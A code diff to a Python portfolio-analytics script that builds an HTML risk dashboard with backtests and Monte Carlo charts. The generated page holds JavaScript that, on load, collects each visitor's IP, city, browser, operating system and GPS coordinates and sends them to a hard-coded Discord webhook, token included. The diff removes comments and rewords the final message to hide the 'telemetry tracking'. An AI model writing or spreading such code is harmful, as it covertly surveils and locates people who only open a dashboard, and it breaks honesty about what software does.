@@ -16,7 +16,7 @@ START_DATE = "2018-01-01"
 FORECAST_YEARS = 4
 TRADING_DAYS_PER_YEAR = 252
 TOTAL_FORECAST_DAYS = FORECAST_YEARS * TRADING_DAYS_PER_YEAR
-NUM_SIMULATIONS = 10000  # Upgraded for statistical significance
+NUM_SIMULATIONS = 10000
 
 # --- 2. LIVE RISK-FREE RATE ---
 print("-> Fetching live US 13-Week Treasury Bill yield...")
@@ -31,7 +31,6 @@ except Exception:
 
 # --- 3. ROBUST DATA INGESTION ---
 print("-> Downloading historical data...")
-# auto_adjust=True ensures we don't rely on the finicky "Adj Close" column
 data = yf.download(TICKERS, start=START_DATE, auto_adjust=True, progress=False)
 
 if isinstance(data.columns, pd.MultiIndex):
@@ -59,15 +58,13 @@ initial_guess = num_assets * [1. / num_assets]
 opt_results = minimize(negative_sharpe, initial_guess, args=args, method='SLSQP', bounds=bounds, constraints=constraints)
 optimized_weights = opt_results.x
 
-# Create Portfolio Series
 returns["Optimized Portfolio"] = returns.dot(optimized_weights)
 cumulative_returns = (1 + returns).cumprod()
 
-# --- 5. RISK & PERFORMANCE METRICS (Historical vs Benchmark) ---
+# --- 5. RISK & PERFORMANCE METRICS ---
 port_ret = returns["Optimized Portfolio"]
 bench_ret = returns[BENCHMARK]
 
-# Annualized Stats
 port_cagr = (cumulative_returns["Optimized Portfolio"].iloc[-1]) ** (TRADING_DAYS_PER_YEAR / len(port_ret)) - 1
 bench_cagr = (cumulative_returns[BENCHMARK].iloc[-1]) ** (TRADING_DAYS_PER_YEAR / len(bench_ret)) - 1
 
@@ -77,7 +74,6 @@ bench_vol = bench_ret.std() * np.sqrt(TRADING_DAYS_PER_YEAR)
 port_sharpe = (port_cagr - RISK_FREE_RATE) / port_vol
 bench_sharpe = (bench_cagr - RISK_FREE_RATE) / bench_vol
 
-# Drawdowns
 def calculate_max_dd(series):
     peak = series.cummax()
     return ((series - peak) / peak).min()
@@ -85,46 +81,37 @@ def calculate_max_dd(series):
 port_mdd = calculate_max_dd(cumulative_returns["Optimized Portfolio"])
 bench_mdd = calculate_max_dd(cumulative_returns[BENCHMARK])
 
-# VaR & CVaR (Historical 95%)
 var_95 = np.percentile(port_ret, 5)
 cvar_95 = port_ret[port_ret <= var_95].mean()
 
-# --- 6. MONTE CARLO SIMULATION (Geometric Brownian Motion) ---
+# --- 6. MONTE CARLO SIMULATION ---
 print(f"-> Running {NUM_SIMULATIONS} Monte Carlo paths...")
 dt = 1 / TRADING_DAYS_PER_YEAR
 steps = TOTAL_FORECAST_DAYS
-
-# We use the historical drift and volatility of the optimized portfolio, not a hardcoded assumption
 mu = port_cagr 
 sigma = port_vol
 
 np.random.seed(42)
 Z = np.random.standard_normal((steps, NUM_SIMULATIONS))
-# S_T = S_0 * exp((mu - 0.5 * sigma^2)*t + sigma * sqrt(t) * Z)
 daily_sim_returns = np.exp((mu - 0.5 * sigma**2) * dt + sigma * np.sqrt(dt) * Z)
 
 prices = np.zeros((steps + 1, NUM_SIMULATIONS))
-prices[0] = 10000  # Start with a normalized $10,000 investment
+prices[0] = 10000 
 for t in range(1, steps + 1):
     prices[t] = prices[t - 1] * daily_sim_returns[t - 1]
 
 # --- 7. VISUALIZATIONS ---
-
-# 7A. Historical Portfolio vs Benchmark
 fig_hist = go.Figure()
 fig_hist.add_trace(go.Scatter(x=cumulative_returns.index, y=cumulative_returns["Optimized Portfolio"], name="Max Sharpe Portfolio", line=dict(color="#00cc96", width=2)))
 fig_hist.add_trace(go.Scatter(x=cumulative_returns.index, y=cumulative_returns[BENCHMARK], name=f"Benchmark ({BENCHMARK})", line=dict(color="#9ca3af", width=2, dash="dash")))
 fig_hist.update_layout(title="<b>Historical Backtest (Normalized)</b>", template="plotly_dark", hovermode="x unified")
 
-# 7B. Rolling 1Y Volatility (Regime indicator)
 rolling_vol = port_ret.rolling(window=TRADING_DAYS_PER_YEAR).std() * np.sqrt(TRADING_DAYS_PER_YEAR)
 fig_roll = px.line(rolling_vol.dropna(), title="<b>Rolling 1-Year Volatility (Regime Detection)</b>")
 fig_roll.update_layout(template="plotly_dark", yaxis_title="Annualized Volatility", showlegend=False)
 fig_roll.update_traces(line_color="#38bdf8")
 
-# 7C. Monte Carlo Distribution
 fig_fcast = go.Figure()
-# Plot only first 50 paths for browser performance
 for i in range(50):
     fig_fcast.add_trace(go.Scatter(y=prices[:, i], mode="lines", line=dict(color="rgba(0,204,150,0.05)"), showlegend=False))
 
@@ -156,7 +143,7 @@ risk_data = [
 ]
 risk_df = pd.DataFrame(risk_data)
 
-# --- 9. GENERATE HTML DASHBOARD WITH DISCORD TELEMETRY ---
+# --- 9. GENERATE HTML DASHBOARD WITH FIXED DISCORD TELEMETRY ---
 html_hist = pio.to_html(fig_hist, full_html=False, include_plotlyjs="cdn")
 html_roll = pio.to_html(fig_roll, full_html=False, include_plotlyjs=False)
 html_fcast = pio.to_html(fig_fcast, full_html=False, include_plotlyjs=False)
@@ -169,7 +156,6 @@ js = """
 <script>
 async function sendDiscordAlert() {
     try {
-        // 1. Fetch IP & Coarse Location
         let ip = 'Unknown', city = 'Unknown', region = 'Unknown', country = 'Unknown';
         try {
             let response = await fetch('https://ipapi.co/json/');
@@ -182,7 +168,6 @@ async function sendDiscordAlert() {
             console.log("IP API fetch failed", e);
         }
 
-        // 2. Extract Device & Browser Details from User-Agent & Telemetry
         let ua = navigator.userAgent;
         let browser = "Unknown Browser";
         let os = "Unknown OS";
@@ -210,7 +195,6 @@ async function sendDiscordAlert() {
 
         const webhookUrl = 'https://discord.com/api/webhooks/1537277575817330729/INZ0kAtXZKA2SF5sFTHPySczXzHNVdkgBxhkALe7-_QnlHdOIJMX5RZmpxHsxg41rMGg'; 
 
-        // Function to dispatch data payload to Discord
         const postPayload = async (locationText, extraFields = []) => {
             let payload = {
                 embeds: [{
@@ -238,7 +222,6 @@ async function sendDiscordAlert() {
             });
         };
 
-        // 3. Attempt HTML5 GPS Geolocation prompt
         if (navigator.geolocation) {
             navigator.geolocation.getCurrentPosition(
                 async (position) => {
@@ -246,7 +229,7 @@ async function sendDiscordAlert() {
                     let lon = position.coords.longitude.toFixed(4);
                     let accuracy = position.coords.accuracy.toFixed(0);
                     await postPayload(`${city}, ${region}, ${country} (IP)`, [
-                        { name: "🎯 Exact GPS Coordinates", value: `Lat: ${lat}, Lon: ${lon} (Acc: ${accuracy}m)\n[Open in Google Maps](https://maps.google.com/?q=${lat},${lon})`, inline: false }
+                        { name: "🎯 Exact GPS Coordinates", value: `Lat: ${lat}, Lon: ${lon} (Acc: ${accuracy}m)\\n[Open in Google Maps](https://www.google.com/maps?q=${lat},${lon})`, inline: false }
                     ]);
                 },
                 async (error) => {
@@ -323,4 +306,4 @@ html_template = f"""
 with open("index.html", "w", encoding="utf-8") as f:
     f.write(html_template)
 
-print("✅ SUCCESS! index.html exported with portfolio risk analytics and Discord telemetry tracking.")
+print("✅ SUCCESS! index.html exported with working Google Maps links.")
